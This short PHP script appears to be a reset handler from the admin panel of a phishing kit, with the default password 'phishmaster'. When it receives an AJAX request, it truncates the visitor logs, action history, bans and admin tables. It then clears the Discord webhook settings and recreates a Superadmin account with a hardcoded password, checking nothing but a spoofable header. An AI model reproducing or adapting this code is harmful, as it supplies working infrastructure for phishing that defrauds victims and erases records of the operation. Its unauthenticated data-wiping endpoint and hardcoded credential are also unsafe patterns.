<?php
    include_once('../../config.php');

    if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
        if($_POST['izin'] == true) {
            $pdo->query("TRUNCATE TABLE logs");
            $pdo->query("TRUNCATE TABLE logs_visitor");
            $pdo->query("TRUNCATE TABLE cevrimici_tablosu");
            $pdo->query("TRUNCATE TABLE action_history");
            $pdo->query("TRUNCATE TABLE bans");    
            $pdo->query("TRUNCATE TABLE admin");
            $discord_webhook = $pdo->prepare('UPDATE admin_settings SET discord_webhook = ? WHERE id = ?');
            $discord_webhook->execute([ 0, 1 ]);
            $discord_webhook_url = $pdo->prepare('UPDATE admin_settings SET discord_webhook_url = ? WHERE id = ?');
            $discord_webhook_url->execute([ "", 1 ]);
            $default_sifre = password_hash("phishmaster", PASSWORD_DEFAULT);
            $stmt = $pdo->prepare('INSERT INTO admin SET kullanici_adi = ?, sifre = ?, yetki = ?, son_gorulme = ?');
            $stmt->execute([ "admin", password_hash("phishmaster", PASSWORD_DEFAULT), "Superadmin", "00.00.0000 00:00:00" ]);
        }
    }

?>